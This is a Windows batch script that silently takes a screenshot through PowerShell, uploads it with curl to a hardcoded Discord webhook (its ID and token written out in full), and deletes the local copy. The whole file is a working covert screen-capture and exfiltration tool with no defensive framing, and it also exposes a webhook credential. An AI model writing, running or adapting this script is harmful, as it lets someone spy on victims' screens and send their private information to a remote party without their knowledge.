@echo off
setlocal

set SS_PATH=%temp%\screenshot.png
set WEBHOOK_URL=https://discordapp.com/api/webhooks/1360855350886006814/GOT1QRdnVhydCohm8vFQFJFT0RuRR7g4DY5JZPN-PEX4sCQ6bgSqMGmEVKKKnad6DGwJ

:: Take screenshot using PowerShell
powershell -command ^
Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
$bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); ^
$graphics = [System.Drawing.Graphics]::FromImage($bmp); ^
$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); ^
$bmp.Save('%SS_PATH%',[System.Drawing.Imaging.ImageFormat]::Png); ^
$graphics.Dispose(); ^
$bmp.Dispose();

:: Upload using curl (curl is builtin in modern Windows)
curl -F "file=@%SS_PATH%" %WEBHOOK_URL%

del %SS_PATH%
endlocal
